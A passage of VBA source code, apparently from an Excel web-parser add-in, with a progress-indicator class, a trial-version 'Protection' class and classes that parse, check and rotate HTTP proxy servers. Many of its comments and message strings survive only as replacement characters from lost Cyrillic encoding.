    Set AddChildIndicator = New ProgressIndicatorNew
    Set AddChildIndicator.Parent = Me
    AddChildIndicator.Show Caption, FPPosition
    Children.Add AddChildIndicator
End Function

Private Sub Class_Initialize()
    Set FP = New F_ProgressNew
    FPStartTime = Now: SubActionsStep = 1
    Set FP.Indicator = Me

    On Error Resume Next
    MSG_EstimatedTime$ = Run(TWN & "tt", "PI_MSG_EstimatedTime")
    If MSG_EstimatedTime$ = "" Then MSG_EstimatedTime$ = "Estimated time left"
    BTN_Stop$ = Run(TWN & "tt", "PI_BTN_Cancel")
    If BTN_Stop$ = "" Then BTN_Stop$ = "Cancel"
    FP.CommandButton_stop.Caption = BTN_Stop$
    Err.Clear
End Sub

Sub Show(ByVal Caption$, Optional ByVal FPPosition& = 0, Optional LogSize& = 0)
    On Error Resume Next
    FP.Caption = Caption: FP.Show
    If FPPosition <> 0 Then Move FPPosition
    FP.Repaint: DoEvents
    SetLogSize LogSize
End Sub

Sub Hide()
    Unload FP
    Set FP = Nothing
End Sub

Sub Repaint()
    FP.Repaint: DoEvents
End Sub

Sub Move(ByVal Position&)
    If Abs(Position) > 3 Then Exit Sub
    If Not Me.Parent Is Nothing Then
        FP.Top = Me.Parent.FP.Top + Me.Parent.FP.Height + 10 + (FP.Height + 3) * (Position - 1)
    Else
        FP.Top = FP.Top + (FP.Height + 3) * Position
    End If
End Sub

Public Property Let line1(ByVal NewValue$): UpdateLine_OldQuery 1, NewValue: End Property
Public Property Let line2(ByVal NewValue$): UpdateLine_OldQuery 2, NewValue: End Property
Public Property Let line3(ByVal NewValue$): UpdateLine_OldQuery 3, NewValue: End Property
Public Property Let StatusBar(ByVal Status As Boolean): FP.ShowStatus = Status: DoEvents: End Property

Private Function StatusText() As String
    On Error Resume Next: Dim dt$, ttf$
    dt = Format(Now - FPStartTime, "HH:NN:SS")
    ttf$ = TimeToFinish$
    StatusText = tt("PI_StatusText_Done") & ": " & Fix(CSng(Lines(1, 1)) * 100) & "%        " & _
                 tt("PI_StatusText_TimeFromStart") & ": " & dt & IIf(Len(ttf$), "        " & ttf$, "")
End Function

Private Function TimeToFinish$()
    On Error Resume Next: Dim dt As Single, Percent&
    Percent& = CSng(Lines(1, 1)) * 100
    If Percent& < 10 Then Exit Function
    dt = (Now - FPStartTime) * (100 - Percent&) / Percent&
    TimeToFinish$ = Format(dt, "H:NN:SS")
    ' TimeToFinish$ = MSG_EstimatedTime$ & ": " & TimeToFinish$
    TimeToFinish$ = tt("PI_StatusText_TimeToFinish") & ": " & TimeToFinish$
End Function

Private Function ProcessLabel$(ByVal txt$)
    If txt Like "*$index*" Then txt = Replace(txt, "$index", SubActionIndex)
    If txt Like "*$count*" Then txt = Replace(txt, "$count", SubActionsCount)
    If txt Like "*$time*" Then txt = Replace(txt, "$time", "")    'TimeToFinish)
    ProcessLabel = txt
End Function

Private Sub Class_Terminate()
    On Error Resume Next
    Unload FP
    Set FP = Nothing: Set Children = Nothing: Set Parent = Nothing
    Erase Lines
End Sub

Private Function ProgressBar_Default_Width() As Double
    ProgressBar_Default_Width = FP.Width - 18
End Function

Function CancelButton() As MSForms.CommandButton
    Set CancelButton = FP.CommandButton_stop
End Function

Sub SetLogSize(ByVal n&)
    On Error Resume Next
    If n < 0 Then n = 0
    If n > 5 Then n = 5
End Sub

Sub Log(ByVal txt$, Optional ByVal MaxLen& = 0)
    On Error Resume Next: Dim currtime$, NewText$
    If ShowTimeInLog Then currtime$ = Time & vbTab
    LogString = LogString & vbNewLine & currtime$ & txt
    NewText$ = Mid(LogString, 3): If MaxLen& Then NewText$ = Right(NewText$, MaxLen&)
    FP.TextBox_Log.text = NewText$
    'If FP.SpinButton_log.Value = 0 Then FP.SpinButton_log.Value = 2: FP.SpinButton_log.Visible = True
    FP.CommandButton_stop.SetFocus: FP.TextBox_Log.SetFocus
End Sub

Sub ClearLog()
    LogString = "": FP.TextBox_Log.text = ""
End Sub

Sub ShowLog()
    On Error Resume Next: Dim FileName$
    FileName$ = Environ("TEMP") & "\macro_log.txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(FileName, True)
        .Write Mid(LogString, 3): .Close
    End With
    FollowHyperlink """" & FileName$ & """"
End Sub

Sub AddButton(ByVal Caption$, ByVal Macro$)
    Const dd& = 18
    With Me.FP.CommandButton_RunMacro
        .Caption = Caption$
        .Visible = True
        .Top = FP.Height - .Height - dd - 20
        .Left = FP.Width - .Width - dd - 15
    End With
    FP.ButtonMacro = Macro$
End Sub

Function MacroButton() As MSForms.CommandButton
    Set MacroButton = FP.CommandButton_RunMacro
End Function

Sub QueryClose()
    On Error Resume Next
    Dim pi As ProgressIndicatorNew
    For Each pi In Children
        pi.QueryClose
        pi.Hide
    Next pi
End Sub

Function ResetSettings() As Variant
    On Error Resume Next
    ResetSettings = Lines
    Erase Lines
    UpdateIndicator True
End Function

Sub RestoreSettings(ByVal arr As Variant)
    Dim i&, j&
    For i = LBound(arr) To UBound(arr)
        For j = LBound(arr, 2) To UBound(arr, 2)
            Lines(i, j) = arr(i, j)
        Next j
    Next i
    UpdateIndicator True
End Sub

Sub ShowMessage(ByVal msg$)
    With Me.FP
        .ShowMessages = True
        .Label_Message = msg$
        .ResizeForm
    End With
End Sub

Sub HideMessages(Optional ByVal Delay As Long = 0)
    With Me.FP
        .Label_Message = ""
        .ShowMessages = False

        If Delay Then
            HideMessage_Time = Now + TimeSerial(0, 0, Delay)
        Else
            .ResizeForm
        End If
    End With
End Sub

' -------------------------- ExtraBar -----------------------------------
Sub ShowExtraBar(ByVal msg$, Optional ByVal ContinuousMode As Boolean)
    On Error Resume Next
    With Me.FP
        .ShowExtraBar = True
        .Label_Extra1 = msg$: .Label_Extra2 = "": .Label_Extra3 = "": .Label_Extra4 = "": .ExtraBar = ""
        .ResizeForm
        If ContinuousMode Then
            Set CurrentPIuserform = Me.FP
            With .ExtraBar: .Height = 14: .Font.Size = 8: End With
            .Repaint
            .StartSlider
        Else
            With .ExtraBar: .Height = 14: .Font.Size = 9: End With
        End If
        ExtraBar_SetColor 49152    'vbGreen
    End With
End Sub

Sub HideExtraBar()
    On Error Resume Next
    Set CurrentPIuserform = Nothing
    With Me.FP
        .ShowExtraBar = False
        .ResizeForm
        .Label_Extra1 = "": .Label_Extra2 = "": .Label_Extra3 = "": .Label_Extra4 = "": .ExtraBar = ""
    End With
    If Me.Temporary Then Me.Hide
End Sub



Sub ExtraBar_SetPercent(ByVal Percent&)
    On Error Resume Next
    If Percent& <= 0 Then Me.FP.ExtraBar = "": Exit Sub
    If Percent& > 100 Then Percent& = 100
    Me.FP.ExtraBar = " " & String(Percent&, ChrW(9610))
End Sub

Sub ExtraBar_SetLineText(ByVal LineIndex&, NewText$)
    On Error Resume Next
    Dim LineLabel As Object
    Select Case LineIndex&
        Case 1: Set LineLabel = Me.FP.Label_Extra1
        Case 2: Set LineLabel = Me.FP.Label_Extra2
        Case 3: Set LineLabel = Me.FP.Label_Extra3
        Case 4: Set LineLabel = Me.FP.Label_Extra4
        Case Else: Exit Sub
    End Select
    If LineLabel.Caption <> NewText$ Then LineLabel.Caption = NewText$
    DoEvents
End Sub

Sub ExtraBar_SetColor(ByVal Color&)
    Me.FP.ExtraBar.ForeColor = Color&
End Sub
Attribute VB_Name = "Protection"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : Protection                    Version:
' Author        : Igor Vakhnenko                   Date: 06.11.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text
Const DEFAULT_REPLACE_INTERVAL& = 8
Const DEFAULT_ARRAY_LIMIT_COUNT& = 5

Const XML_NODE_NAME$ = "Protection"
Public Parent As WebsiteParser

Public SD_Source As Boolean
Public SD_Actions As Boolean
Public Output_Common As Boolean
Public Output_Actions As Boolean
Public Download_Common As Boolean
Public Extra_Common As Boolean
Public Extra_Actions As Boolean
Public ActualVersion As Boolean
Public ArrayLimit As Boolean
Public ArrayLimit_Count As Long
Public Replace As Boolean
Public ReplaceWith As String
Public ReplaceInterval As Long

Private Sub Class_Initialize()
    Me.ReplaceInterval = DEFAULT_REPLACE_INTERVAL&
    Me.ArrayLimit_Count = DEFAULT_ARRAY_LIMIT_COUNT&
    Me.ReplaceWith = SETT.U("3C746573742076657273696F6E3E")
End Sub

Private Sub Class_Terminate()
    Set Parent = Nothing
End Sub

Function GetOutputLimit() As Long
    On Error Resume Next
    If Not Me.Parent.Locked Then Exit Function
    If Not Me.ArrayLimit Then Exit Function
    GetOutputLimit = Me.ArrayLimit_Count
End Function

Function GetReplaceInterval() As Long
    On Error Resume Next
    If Not Me.Parent.Locked Then Exit Function
    If Not Me.Replace Then Exit Function
    GetReplaceInterval = Me.ReplaceInterval
End Function

Function OldVersion() As Boolean
    On Error Resume Next
    If Not Me.Parent.Locked Then Exit Function
    If Not Me.ActualVersion Then Exit Function
    OldVersion = Not CheckIfActualVersion
End Function

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Version")).text = 1

            If Me.SD_Source Then .Attributes.setNamedItem(XML.createAttribute("SD_Source")).text = Abs(CInt(Me.SD_Source))
            If Me.SD_Actions Then .Attributes.setNamedItem(XML.createAttribute("SD_Actions")).text = Abs(CInt(Me.SD_Actions))
            If Me.Output_Common Then .Attributes.setNamedItem(XML.createAttribute("Output_Common")).text = Abs(CInt(Me.Output_Common))
            If Me.Output_Actions Then .Attributes.setNamedItem(XML.createAttribute("Output_Actions")).text = Abs(CInt(Me.Output_Actions))
            If Me.Download_Common Then .Attributes.setNamedItem(XML.createAttribute("Download_Common")).text = Abs(CInt(Me.Download_Common))
            If Me.Extra_Common Then .Attributes.setNamedItem(XML.createAttribute("Extra_Common")).text = Abs(CInt(Me.Extra_Common))
            If Me.Extra_Actions Then .Attributes.setNamedItem(XML.createAttribute("Extra_Actions")).text = Abs(CInt(Me.Extra_Actions))
            If Me.ActualVersion Then .Attributes.setNamedItem(XML.createAttribute("ActualVersion")).text = Abs(CInt(Me.ActualVersion))

            If Me.ArrayLimit Or (Me.ArrayLimit_Count <> DEFAULT_ARRAY_LIMIT_COUNT&) Then
                With .appendChild(XML.createElement("ArrayLimit"))
                    .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.ArrayLimit))
                    .Attributes.setNamedItem(XML.createAttribute("Count")).text = Me.ArrayLimit_Count
                End With
            End If

            If Me.Replace Or (Me.ReplaceInterval <> DEFAULT_REPLACE_INTERVAL&) Then
                With .appendChild(XML.createElement("Replace"))
                    .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.Replace))
                    .Attributes.setNamedItem(XML.createAttribute("Interval")).text = Me.ReplaceInterval
                    .Attributes.setNamedItem(XML.createAttribute("ReplaceWith")).text = Me.ReplaceWith
                End With
            End If

        End With
    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next: Dim v&
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If

    With node
        Me.SD_Source = CBool(Val(.Attributes.getNamedItem("SD_Source").text))
        Me.SD_Actions = CBool(Val(.Attributes.getNamedItem("SD_Actions").text))
        Me.Output_Common = CBool(Val(.Attributes.getNamedItem("Output_Common").text))
        Me.Output_Actions = CBool(Val(.Attributes.getNamedItem("Output_Actions").text))
        Me.Download_Common = CBool(Val(.Attributes.getNamedItem("Download_Common").text))
        Me.Extra_Common = CBool(Val(.Attributes.getNamedItem("Extra_Common").text))
        Me.Extra_Actions = CBool(Val(.Attributes.getNamedItem("Extra_Actions").text))
        Me.ActualVersion = CBool(Val(.Attributes.getNamedItem("ActualVersion").text))

        With .SelectSingleNode("ArrayLimit")
            Me.ArrayLimit = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            v& = 0: v& = Val(.Attributes.getNamedItem("Count").text)
            If v& > 0 Then Me.ArrayLimit_Count = v&
        End With

        With .SelectSingleNode("Replace")
            Me.Replace = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            v& = 0: v& = Val(.Attributes.getNamedItem("Interval").text)
            If v& > 0 Then Me.ReplaceInterval = v&
            Me.ReplaceWith = .Attributes.getNamedItem("ReplaceWith").text
        End With
    End With
End Sub



Attribute VB_Name = "ProxyServer"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko            Date: 06.01.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "Proxy"
Public Parent As ProxyServers

Public Address As String
Public Index As Long

Public QueriesOK As Long ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public QueriesERR As Long ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public Locked As Boolean ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| TRUE |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Public LastAccessTime As Date ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Dim Host$, Credentials$, Login$, Password$

Private Sub Class_Terminate()
    Set Parent = Nothing
End Sub

Function ToText() As String
    On Error Resume Next
    ToText = Me.Address
End Function

Function QueriesCount() As Long
    QueriesCount = QueriesOK + QueriesERR
End Function

Sub SetWinHttpProxySettings(Optional ByRef H As WinHttpRequest)
    On Error Resume Next
    If H Is Nothing Then Set H = wHTTP    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If H Is Nothing Then Set H = http    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|
    
    If Host$ = "" Then
        Credentials$ = "": Login$ = "": Password$ = ""
        If Me.Address Like "*:*@*" Then
            Host$ = Split(Address, "@")(UBound(Split(Address, "@")))
            Credentials$ = Left(Address, InStrRev(Address, "@") - 1)
            Login$ = Split(Credentials$, ":")(0)
            Password$ = Split(Credentials$, ":")(1)
        Else
            Host$ = Me.Address
        End If
    End If
    
    H.SetProxy 2, Host$
    If Len(Credentials$) > 0 Then H.SetCredentials Login$, Password$, 1     ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
End Sub

Sub Apply(Optional ByRef H As WinHttpRequest)
    On Error Resume Next
    SetWinHttpProxySettings H
    
    If Me.Parent.DoNotSwitch Then Exit Sub
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Me.Parent.DoNotSwitch = True
    Me.Parent.Parent.AASets.GetItemByName(ACTION_SET_NAME_ON_PROXY_CHANGED$).Execute
    Me.Parent.DoNotSwitch = False
End Sub

Function GetIP() As String
    On Error Resume Next: Dim Host$
    If Me.Address Like "*:*@*" Then
        Host$ = Split(Address, "@")(UBound(Split(Address, "@")))
    Else
        Host$ = Me.Address
    End If
    GetIP = Split(Host$, ":")(0)
End Function

Function Check() As Boolean
    On Error Resume Next
    Dim res$, objH As New WinHttpRequest, URL$
    URL$ = Me.Parent.Check_URL
    
    With objH
        Me.Apply objH
        .Open "GET", URL$, True
        .Send: DoEvents
        If .WaitForResponse(Me.Parent.Parent.Options.RequestTimeout) Then
            res$ = .ResponseText
            Check = Me.Parent.PageContentOK(res$)
        End If
    End With
    Set objH = Nothing
End Function

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Index")).text = Me.Index
            .Attributes.setNamedItem(XML.createAttribute("Address")).text = Me.Address
        End With
    End With
    Set ExportToXML = node: Set XML = Nothing
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If
    
    With node
        Me.Index = Val(.Attributes.getNamedItem("Index").text)
        Me.Address = .Attributes.getNamedItem("Address").text
    End With
End Sub


Attribute VB_Name = "ProxyServers"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserProxys
' Author        : EducatedFool                     Date: 08.02.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text

Const XML_NODE_NAME$ = "ProxyServers", XML_SUBNODE_NAME$ = "Proxy"
Const DEFAULT_STATS_FILENAME$ = "proxy_stats_{ParserName}.csv"

Public Parent As WebsiteParser
Public Enabled As Boolean
Public Items As New Collection
Public ActiveProxy As ProxyServer
Public DoNotSwitch As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

Public SwitchInCountEnabled As Boolean
Public SwitchInCount As Long    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public ReconnectOnSwitch As Boolean ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinHTTP |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)

Public Attempts As Long    ' |fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL
Public ShowPopup As Boolean    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public StatsFilename As String
Public StatsClearInterval As Long    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public Reuse As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public SaveAddressList As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public Check_URL As String    ' URL, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Check_HTMLfilter As String    ' HTML filter |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public Check_SuccessMask As String    ' |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Public Check_FailMask As String    ' |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

Private Sub Class_Initialize()
    Reuse = True
    SaveAddressList = True
    SwitchInCount = 50
    StatsFilename = DEFAULT_STATS_FILENAME$
    StatsClearInterval = 1440
    Attempts = 3
    ShowPopup = True
    ReconnectOnSwitch = True
End Sub

Private Sub Class_Terminate()
    Set Parent = Nothing
    Set Items = Nothing
End Sub

Sub Apply(Optional ByRef H As WinHttpRequest)
    On Error Resume Next
    If H Is Nothing Then Set H = http    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    If Me.Enabled Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        Me.SwitchToNext True, H
        ParserVariables.item("%ProxyIP%") = Me.ActiveProxy.GetIP
        
    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        H.SetProxy 0, ""
        Set Me.ActiveProxy = Nothing
        ParserVariables.Remove "%ProxyIP%"
    End If
End Sub


Function UpdateActiveProxyInfo(ByVal DownloadStatus As Boolean) As Boolean
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    
    If Me.ActiveProxy Is Nothing Then
        AddBalloon "Function UpdateActiveProxyInfo" & vbNewLine & "ActiveProxy Is Nothing" & vbNewLine & "DownloadStatus = " & DownloadStatus, bt_Warning
        Exit Function
    End If
    
    With Me.ActiveProxy
        If DownloadStatus Then .QueriesOK = .QueriesOK + 1 Else .QueriesERR = .QueriesERR + 1
        .LastAccessTime = Now
        
        ' |fffd||fffd||fffd||fffd||fffd||fffd| Locked = TRUE |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Not DownloadStatus Then .Locked = True
        If SwitchInCountEnabled And (Me.SwitchInCount > 0) Then If .QueriesCount >= Me.SwitchInCount Then .Locked = True
        
        If .Locked Then SwitchToNext True
    End With
End Function


Sub SwitchToNext(Optional ByVal Force As Boolean = False, Optional ByRef H As WinHttpRequest)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
